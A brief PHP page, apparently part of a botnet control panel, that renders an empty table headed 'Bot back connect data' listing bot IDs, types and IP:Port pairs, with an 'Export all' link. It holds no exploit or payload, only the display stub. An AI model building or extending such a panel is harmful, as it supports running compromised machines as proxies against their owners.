<?php
	include "config.php";
	
	print_header();
	
	print_menu();
	
	$html = "
	[<a href=#>Export all</a>] 
	<hr>
	<table class=\"table\">
    <thead>
      <tr>
        <th>BID</th>
        <th>Type</th>
        <th>IP:Port</th>
      </tr>
    </thead>
    <tbody>";
      
      
    $html.="</tbody>
  </table>
	";

	print_content("Bot back connect data",$html);
	
	print_footer();

?>
